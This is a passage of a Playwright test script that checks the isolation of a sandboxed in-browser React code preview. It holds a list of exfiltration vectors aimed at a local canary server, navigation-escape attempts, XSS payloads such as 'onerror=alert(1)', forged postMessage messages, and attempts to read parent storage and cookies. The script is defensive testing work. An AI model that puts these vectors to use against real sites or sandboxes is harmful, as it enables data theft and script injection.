/* eslint-disable @typescript-eslint/no-require-imports */
// ED-019 cross-browser Coding Lab verification: isolation, network attribution, navigation, protocol, resources,
// functional behaviour, accessibility and responsive layout. One run = one engine and one hosting mode.
//
// Usage (app built and started first; this tool starts its own preview host, canaries and stub host):
//   ENGINE=chromium MODE=dedicated node docs/ed-021/regression/tools/verify-matrix.cjs
//   ENGINE=firefox  MODE=fallback  node docs/ed-021/regression/tools/verify-matrix.cjs
// MODE=dedicated expects the app built with NEXT_PUBLIC_LAB_PREVIEW_ORIGIN=http://127.0.0.1:4100 and the preview host
// built with LAB_PARENT_ORIGINS=http://localhost:3118. MODE=fallback expects an app built without that variable.
const fs = require("node:fs");
const http = require("node:http");
const dgram = require("node:dgram");
const path = require("node:path");
const pw = require(process.env.PLAYWRIGHT_CORE || "/home/joren/.cache/yarn/v6/npm-playwright-core-1.64.1-ca9ec82d7da6ced1b2326ec59ef097aaa9a29f94-integrity/node_modules/playwright-core");

const ENGINE = process.env.ENGINE || "chromium";
const MODE = process.env.MODE || "dedicated";
const APP = process.env.BASE || "http://localhost:3118";
const HOST_PORT = 4100;
const HOST = `http://127.0.0.1:${HOST_PORT}`;
const CANARY_PORT = 4902;
const STUN_PORT = 4903;
const SENTINEL_PORT = 4904;
const CANARY = `http://127.0.0.1:${CANARY_PORT}`;
const ROUTE = "/practice/react/use-state-counter";
const HARNESS_UA = "explain-dev-harness/ed-019";
const OUT = `docs/ed-021/regression/matrix/${ENGINE}-${MODE}`;
const LAUNCH = { chromium: { executablePath: process.env.CHROME_PATH || "/home/joren/.cache/ms-playwright/chromium-1248/chrome-linux64/chrome" }, firefox: {}, webkit: {} }[ENGINE];

let testBrowserUA = "";
const report = { engine: ENGINE, mode: MODE, browserVersion: "", app: APP, previewHost: MODE === "dedicated" ? HOST : `${APP}/lab-runtime`, startedAt: new Date().toISOString(), checks: [], observations: {}, network: { browser: [], hostServer: [], canary: [], stun: [], sentinel: [], initiators: [] }, errors: [] };
const check = (name, passed, evidence) => { report.checks.push({ name, passed: Boolean(passed), ...(evidence === undefined ? {} : { evidence }) }); if (!passed) console.log(`FAIL [${ENGINE}/${MODE}] ${name}`, JSON.stringify(evidence ?? "").slice(0, 400)); };
const observe = (name, value) => { report.observations[name] = value; };
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const solution = `import { useState } from "react";

export default function Counter() {
  const [count, setCount] = useState(0);
  return (
    <main>
      <p aria-live="polite">Count: {count}</p>
      <div>
        <button type="button" onClick={() => setCount(count - 1)}>Decrement</button>
        <button type="button" onClick={() => setCount(count + 1)}>Increment</button>
        <button type="button" onClick={() => setCount(0)}>Reset</button>
      </div>
    </main>
  );
}
`;

const at = (code) => `import { useEffect } from "react";\nexport default function App() {\n  useEffect(() => {\n    setTimeout(() => {\n      ${code}\n    }, 50);\n  }, []);\n  return <p id="probe">probe</p>;\n}\n`;
const programs = {
  syntax: "export default function App() {\n  return <div>;\n}\n",
  unsupportedImport: 'import lodash from "lodash";\nexport default function App() { return <p>{String(lodash)}</p>; }\n',
  dynamicImport: 'export default function App() {\n  import("https://example.com/x.js");\n  return null;\n}\n',
  renderThrow: 'export default function App() {\n  const value = 1;\n  if (value) {\n    throw new Error("Boom from render");\n  }\n  return <p>unreachable</p>;\n}\n',
  eventThrow: 'export default function App() {\n  function handle() {\n    throw new TypeError("Handler failed");\n  }\n  return <button type="button" onClick={handle}>Break</button>;\n}\n',
  hookMisuse: 'import { useState } from "react";\nexport default function App() {\n  const [flag, setFlag] = useState(false);\n  if (flag) {\n    useState(1);\n  }\n  return <button type="button" onClick={() => setFlag(true)}>Toggle</button>;\n}\n',
  recursion: "function down(n: number): number {\n  return down(n + 1);\n}\nexport default function App() {\n  return <p>{down(0)}</p>;\n}\n",
  renderLoop: "export default function App() {\n  let i = 0;\n  while (true) {\n    i++;\n  }\n  return <p>{i}</p>;\n}\n",
  clickLoop: 'export default function App() {\n  function spin() {\n    for (;;) {}\n  }\n  return <button type="button" onClick={spin}>Spin</button>;\n}\n',
  microtaskFlood: 'import { useEffect } from "react";\nexport default function App() {\n  useEffect(() => {\n    const spin = () => Promise.resolve().then(spin);\n    spin();\n  }, []);\n  return <p>flooding</p>;\n}\n',
  boundedRegex: 'export default function App() {\n  const start = Date.now();\n  const ok = /(a+)+$/.test("a".repeat(26) + "b");\n  return <p id="r">{String(ok)} {Date.now() - start}</p>;\n}\n',
  regexHang: 'export default function App() {\n  return <p>{String(/(a+)+$/.test("a".repeat(40) + "b"))}</p>;\n}\n',
  memory: "const chunks: number[][] = [];\nexport default function App() {\n  while (true) {\n    chunks.push(new Array(1_000_000).fill(1));\n  }\n}\n",
  largeOutput: "export default function App() {\n  const rows = Array.from({ length: 50000 }, (_, i) => i);\n  return <ul id=\"big\">{rows.map((i) => <li key={i}>Row {i}</li>)}</ul>;\n}\n",
  forge: `export default function Forge() {
  const session = "00000000-0000-4000-8000-000000000000";
  const forged: unknown[] = [
    { channel: "explain-dev-lab", version: 3, type: "hello" },
    { channel: "explain-dev-lab", version: 3, session, runId: 1, type: "rendered" },
    { channel: "explain-dev-lab", version: 3, session, runId: 99, type: "runtime-error", kind: "render", diagnostic: { name: "Injected", message: "<img src=x onerror=alert(1)>" } },
    { channel: "explain-dev-lab", version: 3, type: "init", session, runId: 1, theme: "dark", file: { name: "App.tsx", code: "" } },
    "garbage",
    null,
    { huge: "x".repeat(200000) },
  ];
  for (const message of forged) window.parent.postMessage(message, "*");
  return <p id="forged">sent {forged.length}</p>;
}
`,
  flood: 'export default function Flood() {\n  for (let i = 0; i < 60; i++) window.parent.postMessage({ i }, "*");\n  return <p>flood</p>;\n}\n',
};

// Exfiltration vectors. Each runs inside the preview and reports its own outcome; the canaries are the ground truth.
const exfil = {
  fetch: `fetch("${CANARY}/?v=fetch")`,
  fetchKeepalive: `fetch("${CANARY}/?v=fetch-keepalive", { method: "POST", body: "x", keepalive: true })`,
  fetchApp: `fetch("/?v=fetch-same-host")`,
  xhr: `{ const x = new XMLHttpRequest(); x.open("GET", "${CANARY}/?v=xhr"); x.send(); }`,
  websocket: `new WebSocket("ws://127.0.0.1:${CANARY_PORT}/?v=websocket")`,
  eventSource: `new EventSource("${CANARY}/?v=eventsource")`,
  image: `new Image().src = "${CANARY}/?v=image"`,
  cssUrl: `{ const d = document.createElement("div"); d.style.backgroundImage = "url(${CANARY}/?v=css-url)"; document.body.append(d); getComputedStyle(d).backgroundImage; }`,
  cssImport: `{ const s = document.createElement("style"); s.textContent = "@import url(${CANARY}/?v=css-import); @font-face { font-family: x; src: url(${CANARY}/?v=font); } body { font-family: x; }"; document.head.append(s); }`,
  linkPrefetch: `for (const rel of ["prefetch", "preload", "stylesheet", "preconnect", "dns-prefetch"]) { const l = document.createElement("link"); l.rel = rel; l.as = "fetch"; l.href = "${CANARY}/?v=link-" + rel; document.head.append(l); }`,
  script: `{ const s = document.createElement("script"); s.src = "${CANARY}/x.js?v=script"; document.head.append(s); }`,
  iframe: `{ const f = document.createElement("iframe"); f.src = "${CANARY}/?v=iframe"; document.body.append(f); }`,
  objectEmbed: `{ const o = document.createElement("object"); o.data = "${CANARY}/?v=object"; document.body.append(o); const e = document.createElement("embed"); e.src = "${CANARY}/?v=embed"; document.body.append(e); }`,
  media: `{ const a = document.createElement("audio"); a.src = "${CANARY}/?v=audio"; document.body.append(a); const v = document.createElement("video"); v.src = "${CANARY}/?v=video"; v.poster = "${CANARY}/?v=poster"; document.body.append(v); }`,
  svgImage: `{ document.body.insertAdjacentHTML("beforeend", '<svg><image href="${CANARY}/?v=svg-image" width="1" height="1"></image></svg>'); }`,
  beacon: `navigator.sendBeacon("${CANARY}/?v=beacon", "x")`,
  worker: `new Worker(URL.createObjectURL(new Blob(["fetch('${CANARY}/?v=worker')"], { type: "text/javascript" })))`,
  sharedWorker: `typeof SharedWorker !== "undefined" && new SharedWorker(URL.createObjectURL(new Blob(["fetch('${CANARY}/?v=shared-worker')"], { type: "text/javascript" })))`,
  popup: `window.open("${CANARY}/?v=popup")`,
  form: `{ const f = document.createElement("form"); f.action = "${CANARY}/?v=form"; f.method = "post"; f.target = "_blank"; document.body.append(f); f.submit(); }`,
  webrtc: `{ const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:127.0.0.1:${STUN_PORT}" }] }); pc.createDataChannel("x"); pc.createOffer().then((o) => pc.setLocalDescription(o)); }`,
};

// Navigation vectors (one per run).
const navigations = {
  locationHref: `location.href = "${CANARY}/?v=nav-href"`,
  locationAssign: `location.assign("${CANARY}/?v=nav-assign")`,
  locationReplace: `location.replace("${CANARY}/?v=nav-replace")`,
  windowLocation: `window.location = "${CANARY}/?v=nav-window-location"`,
  navigationApi: `navigation.navigate("${CANARY}/?v=nav-navigation-api")`,
  metaRefresh: `{ const m = document.createElement("meta"); m.httpEquiv = "refresh"; m.content = "0;url=${CANARY}/?v=nav-meta"; document.head.append(m); }`,
  redirectChain: `location.href = "${CANARY}/redirect?v=nav-redirect"`,
  anchorClick: `{ const a = document.createElement("a"); a.href = "${CANARY}/?v=nav-anchor"; document.body.append(a); a.click(); }`,
  anchorPing: `{ const a = document.createElement("a"); a.href = "${CANARY}/?v=nav-anchor-ping"; a.ping = "${CANARY}/?v=ping"; document.body.append(a); a.click(); }`,
  formNavigation: `{ const f = document.createElement("form"); f.action = "${CANARY}/?v=nav-form"; document.body.append(f); f.submit(); }`,
  reload: `location.reload()`,
};

// ---------------------------------------------------------------- servers
function headerRecord(request, extra = {}) {
  return { at: Date.now(), method: request.method, url: request.url, userAgent: request.headers["user-agent"] ?? null, fetchDest: request.headers["sec-fetch-dest"] ?? null, fetchMode: request.headers["sec-fetch-mode"] ?? null, fetchSite: request.headers["sec-fetch-site"] ?? null, referer: request.headers.referer ?? null, origin: request.headers.origin ?? null, remotePort: request.socket.remotePort, ...extra };
}

let hostServer = null;
async function startHost(kind = "real", scenario = "valid") {
  await stopHost();
  if (MODE !== "dedicated") return;
  const policy = await import(path.resolve("preview-host/policy.mjs"));
  if (kind === "real") {
    const { createPreviewHostServer } = await import(path.resolve("preview-host/server.mjs"));
    hostServer = await createPreviewHostServer({ root: path.resolve("preview-host/dist"), frameAncestors: [new URL(APP).origin], onRequest: (record) => report.network.hostServer.push({ server: "preview-host", ...record }) });
  } else {
    const security = policy.previewSecurityHeaders([new URL(APP).origin]);
    hostServer = http.createServer((request, response) => {
      report.network.hostServer.push({ server: "stub-host", scenario: hostServer.scenario, ...headerRecord(request) });
      for (const header of security) response.setHeader(header.key, header.value);
      if (request.url === "/preview.html") { response.setHeader("content-type", "text/html"); return response.end('<!doctype html><script src="/stub.js"></script>'); }
      if (request.url === "/stub.js") { response.setHeader("content-type", "text/javascript"); return response.end(stubScript(hostServer.scenario)); }
      response.statusCode = 404; response.end();
    });
    hostServer.scenario = scenario;
  }
  await new Promise((resolve) => hostServer.listen(HOST_PORT, "127.0.0.1", resolve));
}
async function stopHost() {
  if (!hostServer) return;
  hostServer.closeAllConnections?.();
  await new Promise((resolve) => hostServer.close(resolve));
  hostServer = null;
}

// A deliberately misbehaving preview that speaks the protocol directly (simulates a compromised preview document).
function stubScript(scenario) {
  return `
const parentOrigin = ${JSON.stringify(new URL(APP).origin)};
const scenario = ${JSON.stringify(scenario)};
const hello = (version) => parent.postMessage({ channel: "explain-dev-lab", version, type: "hello" }, parentOrigin);
if (scenario === "incompatible") hello(1);
else {
  addEventListener("message", (event) => {
    if (event.source !== parent || !event.data || event.data.type !== "init") return;
    const port = event.ports[0];
    const { session, runId } = event.data;
    const envelope = { channel: "explain-dev-lab", version: 3, session, runId };
    const send = (message) => port.postMessage({ ...envelope, ...message });
    const raw = (message) => port.postMessage(message);
    const later = (fn, ms = 300) => setTimeout(fn, ms);
    switch (scenario) {
      case "valid": send({ type: "rendered" }); break;
      case "wrong-session": raw({ ...envelope, session: crypto.randomUUID(), type: "rendered" }); later(() => send({ type: "rendered" })); break;
      case "stale-run": raw({ ...envelope, runId: runId - 1, type: "rendered" }); raw({ ...envelope, runId: runId + 1, type: "rendered" }); later(() => send({ type: "rendered" })); break;
      case "malformed": raw({ ...envelope, type: "execute", code: "alert(1)" }); raw({ ...envelope, type: "rendered", extra: true }); raw({ ...envelope, type: "runtime-error", kind: "render", diagnostic: { name: "E", message: "m", html: "<b>" } }); raw("garbage"); raw(null); raw([envelope]); later(() => send({ type: "rendered" })); break;
      case "oversized": send({ type: "runtime-error", kind: "render", diagnostic: { name: "E", message: "x".repeat(5000) } }); send({ type: "compile-error", kind: "syntax", diagnostic: { name: "E", message: "m", detail: "y".repeat(5000) } }); later(() => send({ type: "rendered" })); break;
      case "markup": send({ type: "runtime-error", kind: "render", diagnostic: { name: "<b>Bold</b>", message: "<img src=x onerror=alert(1)><script>alert(2)</script>", line: 1 } }); break;
      case "reordered": send({ type: "runtime-error", kind: "event", diagnostic: { name: "Error", message: "before render" } }); send({ type: "rendered" }); break;
      case "double-hello": hello(3); later(() => send({ type: "rendered" })); break;
      case "delayed": setTimeout(() => send({ type: "rendered" }), 9500); setInterval(() => send({ type: "heartbeat" }), 1000); break;
      case "flood": for (let i = 0; i < 60; i++) raw({ i }); break;
    }
  });
  hello(3);
}`;
}

function startCanaries() {
  const canary = http.createServer((request, response) => {
    report.network.canary.push(headerRecord(request));
    if (request.url.startsWith("/redirect")) { response.writeHead(302, { Location: `${CANARY}/after-redirect` }); return response.end(); }
    if (request.headers.accept?.includes("text/event-stream")) { response.writeHead(200, { "content-type": "text/event-stream" }); return response.end("data: x\n\n"); }
    response.end("canary");
  });
  canary.on("upgrade", (request, socket) => { report.network.canary.push(headerRecord(request, { method: "UPGRADE" })); socket.destroy(); });
  const sentinel = http.createServer((request, response) => { report.network.sentinel.push(headerRecord(request)); response.end("sentinel"); });
  const stun = dgram.createSocket("udp4");
  stun.on("message", (message, remote) => report.network.stun.push({ at: Date.now(), bytes: message.length, from: `${remote.address}:${remote.port}` }));
  return Promise.all([
    new Promise((resolve) => canary.listen(CANARY_PORT, "127.0.0.1", resolve)),
    new Promise((resolve) => sentinel.listen(SENTINEL_PORT, "127.0.0.1", resolve)),
    new Promise((resolve) => stun.bind(STUN_PORT, "127.0.0.1", resolve)),
  ]).then(() => ({ close: () => { canary.closeAllConnections?.(); canary.close(); sentinel.close(); stun.close(); } }));
}

// ---------------------------------------------------------------- page helpers
async function newPage(browser, { width = 1440, theme = "dark", hasTouch = false } = {}) {
  const context = await browser.newContext({ viewport: { width, height: 900 }, reducedMotion: "reduce", hasTouch });
  await context.addInitScript((theme) => {
    if (window.top !== window) return;
    window.__parentErrors = [];
    window.addEventListener("error", (event) => window.__parentErrors.push(String(event.message)));
    window.addEventListener("unhandledrejection", (event) => window.__parentErrors.push(String(event.reason)));
    localStorage.setItem("theme", theme);
    if (!localStorage.getItem("explain-dev:v1:preferences")) localStorage.setItem("explain-dev:v1:preferences", '{"version":1,"bookmarkedTopicIds":["preserve"],"readTopicIds":["preserve"]}');
  }, theme);
  const page = await context.newPage();
  page.setDefaultTimeout(20000);
  const events = { dialogs: 0, popups: 0, pageErrors: [] };
  page.on("dialog", (dialog) => { events.dialogs++; dialog.dismiss().catch(() => {}); });
  context.on("page", () => { events.popups++; });
  page.on("pageerror", (error) => events.pageErrors.push(error.message));
  const record = (state) => (request) => {
    const frame = request.frame();
    let frameUrl = "";
    try { frameUrl = frame?.url() ?? ""; } catch { frameUrl = "(detached)"; }
    report.network.browser.push({ at: Date.now(), state, method: request.method(), url: request.url(), resourceType: request.resourceType(), navigation: request.isNavigationRequest(), frameUrl, mainFrame: frame === page.mainFrame(), redirectedFrom: request.redirectedFrom()?.url() ?? null, failure: state === "failed" ? request.failure()?.errorText ?? null : undefined });
  };
  page.on("request", record("issued"));
  page.on("requestfailed", record("failed"));
  if (ENGINE === "chromium") {
    const cdp = await context.newCDPSession(page);
    await cdp.send("Network.enable");
    cdp.on("Network.requestWillBeSent", (event) => report.network.initiators.push({ url: event.request.url, type: event.type, initiator: event.initiator?.type, initiatorUrl: event.initiator?.url ?? event.initiator?.stack?.callFrames?.[0]?.url ?? null }));
  }
  return { context, page, events };
}

const workspaceStatus = (page) => page.locator("[data-lab-workspace]").getAttribute("data-preview-status");
const runId = async (page) => Number(await page.locator("[data-preview-frame]").getAttribute("data-run-id"));
const frameLocator = (page) => page.frameLocator('iframe[title="Preview of App.tsx"]');
const problems = async (page) => ((await page.locator("[data-lab-problems]").count()) ? page.locator("[data-lab-problems]").innerText() : "");

async function waitStatus(page, previous, statuses, timeout = 20000) {
  await page.waitForFunction(([previousRun, wanted]) => {
    const frame = document.querySelector("[data-preview-frame]");
    const state = document.querySelector("[data-lab-workspace]")?.getAttribute("data-preview-status");
    return frame && Number(frame.getAttribute("data-run-id")) > previousRun && wanted.includes(state);
  }, [previous, statuses], { timeout });
  return workspaceStatus(page);
}

async function setCode(page, code) {
  await page.locator(".cm-content").click();
  // A person cannot type before the editor has focus; wait for it (fails the run if focus never arrives).
  await page.waitForFunction(() => document.activeElement?.classList.contains("cm-content"), null, { timeout: 3000 });
  await page.keyboard.press("ControlOrMeta+a");
  await page.keyboard.insertText(code);
}

async function run(page, code, statuses, timeout) {
  const previous = await runId(page);
  if (code !== null) await setCode(page, code);
  const started = Date.now();
  await page.locator("[data-lab-run]").click();
  const status = await waitStatus(page, previous, statuses, timeout);
  return { status, ms: Date.now() - started };
}

async function openChallenge(page) {
  const response = await page.goto(APP + ROUTE, { waitUntil: "load" });
  await waitStatus(page, 0, ["ready"], 30000);
  return response;
}

const startMonitor = (page) => page.evaluate(() => { window.__gap = { max: 0, last: performance.now() }; window.__gapTimer = setInterval(() => { const now = performance.now(); window.__gap.max = Math.max(window.__gap.max, now - window.__gap.last); window.__gap.last = now; }, 50); });
const stopMonitor = (page) => page.evaluate(() => { clearInterval(window.__gapTimer); return Math.round(window.__gap.max); });
const canaryHitsSince = (index) => report.network.canary.slice(index);

async function rendererCpu(browser) {
  if (ENGINE !== "chromium") return null;
  try {
    const cdp = await browser.newBrowserCDPSession();
    const { processInfo } = await cdp.send("SystemInfo.getProcessInfo");
    await cdp.detach();
    return processInfo.filter((entry) => entry.type === "renderer").map((entry) => ({ id: entry.id, cpuTime: entry.cpuTime }));
  } catch (error) {
    return { unavailable: error.message };
  }
}
async function busyRenderers(browser, ms) {
  const before = await rendererCpu(browser);
  if (!Array.isArray(before)) { await sleep(ms); return before ?? "not measurable in this engine"; }
  await sleep(ms);
  const after = await rendererCpu(browser);
  return after.map((entry) => ({ id: entry.id, cpuSeconds: +(entry.cpuTime - (before.find((item) => item.id === entry.id)?.cpuTime ?? 0)).toFixed(2) })).filter((entry) => entry.cpuSeconds > 0.2);
}

// ---------------------------------------------------------------- suites
async function suiteIsolationAndFunction(browser) {
  const { context, page, events } = await newPage(browser);
  const response = await openChallenge(page);
  check("challenge route returns 200", response.status() === 200);
  const iframe = page.locator('iframe[title="Preview of App.tsx"]');
  const expectedSrc = MODE === "dedicated" ? `${HOST}/preview.html` : "/lab-runtime/preview.html";
  check("iframe sandbox is exactly allow-scripts", (await iframe.getAttribute("sandbox")) === "allow-scripts");
  check(`iframe loads the ${MODE} preview document`, (await iframe.getAttribute("src")) === expectedSrc, await iframe.getAttribute("src"));
  check("preview mode attribute", (await page.locator("[data-preview-frame]").getAttribute("data-preview-mode")) === (MODE === "dedicated" ? "dedicated" : "same-origin"));
  const practiceCsp = (await page.request.get(APP + ROUTE, { headers: { "user-agent": HARNESS_UA } })).headers()["content-security-policy"];
  check("Practice route restricts frames (and preview navigation) to the preview origin", practiceCsp === `frame-src ${MODE === "dedicated" ? HOST : "'self'"}`, practiceCsp);
  const initial = await page.evaluate(() => ({ url: location.href, title: document.title, preferences: localStorage.getItem("explain-dev:v1:preferences"), theme: localStorage.getItem("theme"), cookie: document.cookie }));

  // Functional
  check("starter renders Count: 0", (await frameLocator(page).locator("p").textContent()) === "Count: 0");
  await frameLocator(page).getByRole("button", { name: "Increment" }).click();
  check("starter TODO handlers do nothing", (await frameLocator(page).locator("p").textContent()) === "Count: 0");
  const solved = await run(page, solution, ["ready"]);
  const sequence = [];
  for (const label of ["Increment", "Increment", "Decrement", "Reset", "Decrement"]) {
    await frameLocator(page).getByRole("button", { name: label }).click();
    sequence.push(await frameLocator(page).locator("p").textContent());
  }
  check("edited learner code genuinely runs", solved.status === "ready" && JSON.stringify(sequence) === JSON.stringify(["Count: 1", "Count: 2", "Count: 1", "Count: 0", "Count: -1"]), sequence);
  check("edited text changes the preview", (await run(page, solution.replace("Count: {count}", "Clicks: {count}"), ["ready"])).status === "ready" && (await frameLocator(page).locator("p").textContent()) === "Clicks: 0");
  let previous = await runId(page);
  await page.locator("[data-lab-reset]").click();
  await waitStatus(page, previous, ["ready"]);
  check("Reset restores and re-runs the starter", (await page.locator(".cm-content").innerText()).includes("TODO: Replace this constant") && (await frameLocator(page).locator("p").textContent()) === "Count: 0");
  await page.locator(".cm-content").click();
  await page.keyboard.press("ControlOrMeta+z");
  check("one undo after Reset restores the replaced code", (await page.locator(".cm-content").innerText()).includes("Clicks: {count}"));
  check("syntax error is a recoverable compile error", (await run(page, programs.syntax, ["compile-error"])).status === "compile-error" && /SyntaxError:[\s\S]*Line 2, column \d+/.test(await problems(page)));
  previous = await runId(page);
  await setCode(page, solution);
  await page.getByRole("button", { name: "Run again" }).click();
  check("Run again recovers from a compile error", await waitStatus(page, previous, ["ready"]) === "ready");
  check("unsupported import rejected", (await run(page, programs.unsupportedImport, ["compile-error"])).status === "compile-error" && (await problems(page)).includes('"lodash" can\'t be imported'));
  check("dynamic import rejected at compile time", (await run(page, programs.dynamicImport, ["compile-error"])).status === "compile-error" && (await problems(page)).includes("Dynamic import() is not available"));
  check("render error contained with message, line and component stack", (await run(page, programs.renderThrow, ["runtime-error"])).status === "runtime-error" && /Error: Boom from render[\s\S]*Line 4/.test(await problems(page)) && /(at App\b|\bApp@)/.test(await problems(page)), await problems(page));
  check("event-handler program renders", (await run(page, programs.eventThrow, ["ready"])).status === "ready");
  await frameLocator(page).getByRole("button", { name: "Break" }).click();
  await page.waitForFunction(() => document.querySelector("[data-lab-workspace]")?.getAttribute("data-preview-status") === "runtime-error");
  check("event-handler error reported, preview still usable", (await problems(page)).includes("TypeError: Handler failed") && await frameLocator(page).getByRole("button", { name: "Break" }).isVisible());
  check("hook-misuse program renders", (await run(page, programs.hookMisuse, ["ready"])).status === "ready");
  await frameLocator(page).getByRole("button", { name: "Toggle" }).click();
  await page.waitForFunction(() => document.querySelector("[data-lab-workspace]")?.getAttribute("data-preview-status") === "runtime-error");
  check("React development error for Rules of Hooks", /Rendered more hooks than during the previous render/.test(await problems(page)), await problems(page));
  check("unbounded recursion reported as RangeError", (await run(page, programs.recursion, ["runtime-error"])).status === "runtime-error" && /(RangeError|InternalError)/.test(await problems(page)) && /(call stack|too much recursion)/i.test(await problems(page)), await problems(page));

  // Isolation from the parent
  const isolationProgram = `import { useEffect, useState } from "react";
type Row = [string, string];
const attempt = (name: string, run: () => unknown): Row => { try { return [name, "ALLOWED: " + String(run())]; } catch (error) { return [name, "blocked: " + (error as Error).name]; } };
// Promise-based APIs: a rejection or a synchronous throw both count as blocked.
const settle = (name: string, run: () => Promise<unknown>): Promise<Row> => { try { return run().then((value) => [name, "ALLOWED: " + String(value)] as Row, (error) => [name, "blocked: " + String((error && (error as Error).name) || error)] as Row); } catch (error) { return Promise.resolve([name, "blocked: " + (error as Error).name] as Row); } };
const request = (name: string, open: () => IDBOpenDBRequest): Promise<Row> => settle(name, () => new Promise((resolve, reject) => { const r = open(); r.onsuccess = () => resolve("opened"); r.onerror = () => reject(r.error); }));
export default function Isolation() {
  const [asyncRows, setAsyncRows] = useState<Row[] | null>(null);
  useEffect(() => {
    Promise.all([
      request("indexedDB.open", () => indexedDB.open("x")),
      settle("serviceWorker", () => navigator.serviceWorker.register("/sw.js")),
      settle("caches", () => caches.keys()),
    ]).then(setAsyncRows);
  }, []);
  const [rows] = useState<Row[]>(() => [
    attempt("origin", () => self.origin),
    attempt("parent.document", () => window.parent.document.title),
    attempt("parent.localStorage", () => window.parent.localStorage.getItem("explain-dev:v1:preferences")),
    attempt("own.localStorage", () => window.localStorage.getItem("x")),
    attempt("sessionStorage", () => window.sessionStorage.length),
    attempt("document.cookie", () => document.cookie),
    attempt("parent.appState", () => (window.parent as unknown as { next: unknown }).next),
    attempt("parent.location.href", () => window.parent.location.href),
    attempt("top.navigation", () => { (window.top as Window).location.href = "/"; return "no error"; }),
    attempt("parent.history", () => { window.parent.history.back(); return "no error"; }),
    attempt("eval", () => eval("1 + 1")),
    attempt("Function", () => Function("return 1")()),
    attempt("window.open", () => window.open("about:blank")),
    attempt("alert", () => { alert("x"); return "returned"; }),
  ]);
  return asyncRows ? <pre id="results">{JSON.stringify([...rows, ...asyncRows])}</pre> : <p>checking</p>;
}
`;
  check("isolation program renders", (await run(page, isolationProgram, ["ready"])).status === "ready");
  await frameLocator(page).locator("#results").waitFor({ timeout: 10000 });
  const rows = Object.fromEntries(JSON.parse(await frameLocator(page).locator("#results").textContent()));
  observe("isolation results", rows);
  const blocked = (value) => /^blocked: /.test(value ?? "");
  check("preview origin is opaque", rows.origin === "ALLOWED: null", rows.origin);
  for (const name of ["parent.document", "parent.localStorage", "own.localStorage", "sessionStorage", "document.cookie", "parent.appState", "parent.location.href", "top.navigation", "parent.history", "eval", "Function"]) check(`blocked: ${name}`, blocked(rows[name]), rows[name]);
  check("blocked: IndexedDB", blocked(rows["indexedDB.open"]), rows["indexedDB.open"]);
  check("blocked: service worker registration", blocked(rows.serviceWorker), rows.serviceWorker);
  check("blocked: Cache Storage", blocked(rows.caches), rows.caches);
  check("window.open opens no popup (returns null or throws)", (rows["window.open"] === "ALLOWED: null" || blocked(rows["window.open"])) && events.popups === 0, rows["window.open"]);
  check("alert is ignored (no dialog)", events.dialogs === 0, { dialogs: events.dialogs, result: rows.alert });

  // Exfiltration vectors: one run with all of them; the canaries decide.
  const canaryBefore = report.network.canary.length;
  const stunBefore = report.network.stun.length;
  const vectorCode = Object.entries(exfil).map(([name, code]) => `try { ${code}; } catch (error) { console.log("vector ${name} threw", (error as Error).name); }`).join("\n      ");
  check("exfiltration program renders", (await run(page, at(vectorCode), ["ready"])).status === "ready");
  await sleep(3000);
  const exfilHits = canaryHitsSince(canaryBefore);
  check("no exfiltration vector reached the HTTP canary", exfilHits.length === 0, exfilHits);
  check("no WebRTC/STUN packet reached the UDP canary", report.network.stun.length === stunBefore, report.network.stun.slice(stunBefore));
  check("no popup windows", events.popups === 0);
  observe("exfiltration vectors attempted", Object.keys(exfil));

  // Navigation vectors: each in its own run.
  const navigationResults = {};
  for (const [name, code] of Object.entries(navigations)) {
    const before = report.network.canary.length;
    const previousRun = await runId(page);
    await setCode(page, at(code));
    const started = Date.now();
    await page.locator("[data-lab-run]").click();
    await waitStatus(page, previousRun, ["ready", "stopped", "runtime-error"]);
    let final = await workspaceStatus(page);
    const deadline = Date.now() + 4000;
    while (final === "ready" && Date.now() < deadline) { await sleep(100); final = await workspaceStatus(page); }
    await sleep(600);
    const hits = canaryHitsSince(before);
    navigationResults[name] = { finalStatus: await workspaceStatus(page), detectedMs: final === "ready" ? null : Date.now() - started - 600, requestsToCanary: hits.map((hit) => hit.url), problems: (await problems(page)).split("\n").filter(Boolean).slice(1, 3).join(" | "), parentUrlUnchanged: page.url() === initial.url };
  }
  observe("navigation attempts", navigationResults);
  for (const [name, result] of Object.entries(navigationResults)) {
    check(`navigation ${name}: parent page never navigates`, result.parentUrlUnchanged);
    if (name === "anchorClick" || name === "anchorPing") check(`navigation ${name}: blocked before any request`, result.requestsToCanary.length === 0 && result.finalStatus === "runtime-error" && result.problems.includes("Links to other pages are disabled"), result);
    else if (name === "formNavigation") check(`navigation ${name}: blocked by the sandbox`, result.requestsToCanary.length === 0, result);
    else if (name === "reload") check(`navigation ${name}: detected and preview removed`, result.finalStatus === "stopped", result);
    else check(`navigation ${name}: refused before any request, detected and preview removed`, result.requestsToCanary.length === 0 && result.finalStatus === "stopped" && result.problems.includes("Navigation is disabled"), result);
  }

  // Forged messages from inside the preview and from other windows.
  check("forging program renders", (await run(page, programs.forge, ["ready"])).status === "ready");
  await sleep(500);
  check("7 forged postMessage payloads from the preview rejected", Number(await page.locator("[data-preview-frame]").getAttribute("data-rejected-messages")) === 7 && await workspaceStatus(page) === "ready" && (await problems(page)) === "");
  const foreignRun = await runId(page);
  await page.evaluate(() => {
    window.postMessage({ channel: "explain-dev-lab", version: 3, type: "hello" }, "*");
    const intruder = document.createElement("iframe");
    intruder.id = "intruder";
    intruder.srcdoc = `<script>parent.postMessage({ channel: "explain-dev-lab", version: 3, type: "hello" }, "*"); parent.postMessage({ channel: "explain-dev-lab", version: 3, session: "00000000-0000-4000-8000-000000000000", runId: 1, type: "compile-error", kind: "syntax", diagnostic: { name: "Foreign", message: "from another frame" } }, "*");<\/script>`;
    document.body.append(intruder);
  });
  await sleep(800);
  check("messages from other windows and frames are ignored", await runId(page) === foreignRun && await workspaceStatus(page) === "ready" && !(await page.locator("body").innerText()).includes("Foreign"));
  await page.evaluate(() => document.getElementById("intruder")?.remove());
  check("message flood from the preview closes it", (await run(page, programs.flood, ["stopped"])).status === "stopped" && (await problems(page)).includes("too many unexpected messages"));

  const final = await page.evaluate(() => ({ url: location.href, title: document.title, preferences: localStorage.getItem("explain-dev:v1:preferences"), theme: localStorage.getItem("theme"), cookie: document.cookie, errors: window.__parentErrors }));
  check("parent URL, title, preferences, theme and cookies unchanged", final.url === initial.url && final.title === initial.title && final.preferences === initial.preferences && final.theme === initial.theme && final.cookie === initial.cookie, { initial, final });
